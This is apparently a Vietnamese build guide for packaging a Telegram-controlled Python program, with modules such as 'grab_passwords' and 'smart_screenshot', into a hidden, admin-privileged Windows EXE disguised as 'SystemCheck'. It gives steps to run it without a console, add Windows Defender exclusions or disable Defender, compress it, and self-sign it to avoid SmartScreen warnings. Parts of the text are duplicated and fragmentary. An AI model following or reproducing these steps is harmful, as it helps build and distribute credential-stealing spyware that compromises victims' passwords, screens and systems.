# 📦 BUILD EXE - HƯỚNG DẪN CHI TIẾT

> **Developer:** TsByin  
> **Version:** 2.0 (EXE Build Guide - Refactored Architecture)

## **CHUẨN BỊ TRƯỚC KHI BUILD**

### **⚡ QUAN TRỌNG: PyInstaller sẽ tự động include tất cả modules!**

Khi build `V10.py`, PyInstaller sẽ:
1. **Phân tích imports** trong V10.py
2. **Tự động detect** các file được import:
   - `config.py` ✓
   - `utils.py` ✓
   - `grabber.py` ✓
   - `media.py` ✓
   - `monitor.py` ✓
3. **Include chúng vào EXE** cùng Python runtime

```python
# V10.py imports - PyInstaller sẽ tự động include:
from config import API_TOKEN, ADMIN_ID, ...      # ← config.py
from utils import load_settings, ...              # ← utils.py
from grabber import grab_passwords, ...           # ← grabber.py
from media import smart_screenshot, ...           # ← media.py
from monitor import SystemMonitor, BotStats       # ← monitor.py
```

**Kết quả:** Single EXE file chứa tất cả tính năng! ✨

---

### **1. Kiểm Tra Setup**

```powershell
# Xác minh tất cả files và dependencies
python verify_setup.py
```

Kết quả phải hiển thị:
```
[✓] All modules importable
[✓] All dependencies installed
✅ READY TO BUILD EXE
```

Nếu có lỗi, cài lại:
```powershell
pip install -r requirements.txt
```

### **2. Chuẩn Bị .env File**

File `.env` **phải** có đầy đủ config:

```bash
API_TOKEN=YOUR_TELEGRAM_BOT_TOKEN_HERE
ADMIN_ID=YOUR_ADMIN_ID_HERE
MONITOR_INTERVAL=1
CPU_ALERT_THRESHOLD=95
CPU_ALERT_COOLDOWN=300
MOTION_DETECT_AREA=3000
```

### **3. Cài PyInstaller**

```powershell
pip install pyinstaller
```

### **4. Tạo Icon (Optional)**

```powershell
# Nếu có icon (icon.ico) thì dùng --icon=icon.ico
# Nếu không, bỏ qua --icon parameter
```

---

## **BUILD - LỆNH ĐƠN GIẢN**

```bash
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V10.py
```

**Output:**
- `dist/SystemCheck.exe` (~150MB)
- Admin privileges (UAC prompt on first run)
- Chạy ở background (no console)
- Custom icon

**Sau đó copy .env:**
```bash
Copy-Item .env dist/.env
```

---

## **FULL BUILD WORKFLOW**

### **Bước 1: Verify Setup**

```powershell
python verify_setup.py
```

Kết quả:
```
[✓] Python version OK
[✓] All files found
[✓] All modules importable
[✓] Config OK
[✓] Telegram token valid
...
🚀 READY TO RUN:
  → python V10.py
```

### **Bước 2: Test Bot Locally**

```powershell
python V10.py
```

Nếu thành công:
```
✅ Bot initialized for Admin: YOUR_ID
✅ Bot Started. ID: YOUR_ID
🟢 SYSTEM ONLINE
🟢 System monitor started
```

Test trên Telegram: gửi `/start` hoặc `/menu 1`

### **Bước 3: Build EXE**

```powershell
# Production build (PowerShell)
# Note: use backtick ` as line continuation and NO trailing space after it.
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V10.py

---

## **FULL BUILD WORKFLOW**

## **TROUBLESHOOTING BUILD**

### **Problem 1: "ModuleNotFoundError: No module named 'config'"**

**Nguyên nhân:** PyInstaller không detect modules (mô-đun)

**Cách sửa:**
```bash
pyinstaller --onefile --noconsole --uac-admin --hidden-import=config --hidden-import=utils --hidden-import=grabber --hidden-import=media --hidden-import=monitor V10.py
```

### **Problem 2: "No such file or directory: '.env'"**

**Nguyên nhân:** EXE không tìm thấy `.env` file

**Cách sửa:**
```powershell
# .env phải ở CÙNG FOLDER với .exe
Copy-Item .env .\release\.env

# Sau đó chạy EXE từ release folder
cd .\release
.\SystemCheck.exe
```

### **Problem 3: "Access Denied" khi chạy EXE**

**Cách sửa:**
1. Run as Administrator
2. Add vào Windows Defender exclusions:
   ```powershell
   Add-MpPreference -ExclusionPath "C:\path\to\release"
   ```
3. Hoặc tắt Windows Defender tạm thời

### **Problem 4: EXE quá lớn (500+ MB)**

**Cách sửa:**
1. Dùng UPX compression:
   ```powershell
   pip install upx
   upx .\release\SystemCheck.exe --best
   # 150MB → 50MB
   ```
2. Hoặc dùng `--onedir` (folder mode):
   ```powershell
   pyinstaller --onedir --noconsole --uac-admin V10.py
   ```

### **Problem 5: Bot không connect sau build**

**Check:**
1. `.env` file có đúng folder?
2. `API_TOKEN` đúng không?
3. `ADMIN_ID` đúng không?
4. Network bình thường?

**Cách debug:**
```powershell
# Xem bot.log
Get-Content .\release\bot.log

# Kiểm tra config
cd .\release
python -c "from config import API_TOKEN, ADMIN_ID; print(f'Token: {API_TOKEN[:10]}...'); print(f'Admin: {ADMIN_ID}')"
```

```

### **Problem 6: File icon.ico không tìm thấy**

**Nguyên nhân & Cách sửa:** Đảm bảo `icon.ico` nằm cùng thư mục với V10.py (project root). PyInstaller sẽ tự động tìm icon từ thư mục hiện tại.

---

## **FILE STRUCTURE AFTER BUILD**

```
Trước build:
d:\V10\
├── V10.py              (Main bot)
├── config.py           
├── utils.py            
├── grabber.py          
├── media.py            
├── monitor.py          
├── verify_setup.py     
├── .env                (QUAN TRỌNG!)
├── icon.ico            
└── requirements.txt    

Sau build:
d:\V10\
├── dist/
│   ├── SystemCheck.exe (150 MB)
│   └── .env            (PHẢI copy vào đây!)
├── build/              (Build artifacts - có thể xóa)
└── ... (source files)
```

---

## **QUICK REFERENCE**

1. Verify setup: `python verify_setup.py`
2. Test locally: `python V10.py`
3. Build EXE: `pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V10.py`
4. Copy .env: `Copy-Item .env dist\.env`
5. Test EXE: `cd dist` → `.\SystemCheck.exe`
6. Check logs: `Get-Content bot.log`

---

```
Source files:
V10.py          ≈  25 KB
config.py       ≈   4 KB
utils.py        ≈  10 KB
grabber.py      ≈  15 KB
media.py        ≈   7 KB
monitor.py      ≈  10 KB
TOTAL source    ≈  71 KB

Compiled EXE:
SystemCheck.exe ≈ 150 MB (includes Python runtime + libraries)
  ├─ Python runtime   ≈  80 MB
  ├─ Libraries (pip)  ≈  60 MB
  ├─ Our code         ≈   7 MB
  └─ Cache/Temp       ≈   3 MB

Compressed (with UPX):
SystemCheck.exe ≈ 45-50 MB
```

---

## **CODE SIGNING (OPTIONAL)**

Để tránh SmartScreen warning:

```powershell
# 1. Create certificate (as Administrator)
$cert = New-SelfSignedCertificate -DnsName "SystemMonitor" `
    -CertStoreLocation "Cert:\CurrentUser\My" `
    -Type CodeSigningCert

# 2. Sign EXE
Set-AuthenticodeSignature -Certificate $cert `
    -FilePath ".\release\SystemCheck.exe"

# 3. Verify
Get-AuthenticodeSignature ".\release\SystemCheck.exe"
```

**Benefit:** Shows "SystemMonitor" instead of "Unknown Publisher"

---

## **DEPLOYMENT CHECKLIST**

- [x] `verify_setup.py` passes all checks
- [x] Bot tested locally with `python V10.py`
- [x] All features work on Telegram
- [x] Build EXE successfully
- [x] `.env` copied to release folder
- [x] EXE tested locally
- [x] `bot.log` check for errors
- [x] Build artifacts cleaned up
- [x] Distribution package created
- [x] (Optional) Code signing done

---

## **QUICK REFERENCE COMMANDS**

```powershell
# 1. Verify
python verify_setup.py

# 2. Test locally
python V10.py

# 3. Build
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V10.py

# 4. Copy config
Copy-Item .env .\dist\.env

# 5. Test EXE
cd .\dist
.\SystemCheck.exe

# 6. Cleanup (optional)
Remove-Item .\build -Recurse -Force
Remove-Item .\build -Recurse -Force
```

---

## **FINAL NOTES**

✅ **Modular Architecture:** Tất cả 7 modules được build vào EXE  
✅ **Config Management:** `.env` file separate từ EXE  
✅ **Security:** No hardcoded tokens  
✅ **Logging:** Full logging to `bot.log`  
✅ **Performance:** Concurrent operations, debounced alerts  
✅ **Error Handling:** Comprehensive error logging  

**Remember:**
1. **ALWAYS** include `.env` in same folder as EXE
2. **NEVER** commit `.env` to Git (has tokens!)
3. **TEST** EXE locally before deployment
4. **MONITOR** `bot.log` for errors

---

**🎉 Build successful? Your bot is ready for deployment!**
